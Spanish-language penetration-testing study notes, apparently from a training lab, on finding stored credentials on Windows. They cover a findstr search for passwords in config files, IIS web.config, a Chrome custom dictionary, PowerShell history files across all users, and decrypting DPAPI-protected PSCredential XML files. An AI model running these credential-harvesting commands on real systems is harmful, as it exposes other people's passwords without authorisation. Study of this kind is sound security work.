
## Archivos de configuracion

1. Busqueda de archivos (muchas aplicaciones guardan contraseñas en texto plano en archivos de conf y otros)

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

	La informacion sensible de IIS puede estar en archivos como web.config que suele estar ubicado en su webroot (C:\inetpub\wwwroot\web.config), aunque puede haber multiples ubicaciones

## Archivos de diccionario

Las palabras basadas en navegador y otras aplicaciones subrayan palabras desconocidas en rojo. Es posible que el usuario haya metido sus credenciales en el diccionario para que no se subrayen en rojo

```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

## Archivo de historial de PS

- C:\Users\\<\username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_hist

1. Confirmando la ruta de guardado de historial de PS:

```
(Get-PSReadLineOption).HistorySavePath
```
![[Pasted image 20260912153404.png]]

2. Leyendo el archivo de historial de PS

```
gc (Get-PSReadLineOption).HistorySavePath
```
![[Pasted image 20260912153449.png]]

3. Tambien podemos usar este comando de una liena para recuperar el contenido de todos los archivos de historial de PS a los que podamos acceder:

```
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
![[Pasted image 20260912153549.png]]


## Credenciales de PS

Estas credenciales se usan a menudo en tareas de scripting y automatizacion para almacenar las credenciales cifradas protegidas por DPAPI (Data Protection API) lo que significa que solo pueden ser descifradas por el mismo usuario en el mismo ordenador

Ejemplo de script:

![[Pasted image 20260912153947.png]]

#### Descrifrando credenciales de PS

Si obtenemos ejecucion de comandos en contexto de este usuario podemos abusar de DPAPI para que vuelque las credenciales en el archivo `pass.xml` de ejemplo:

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```
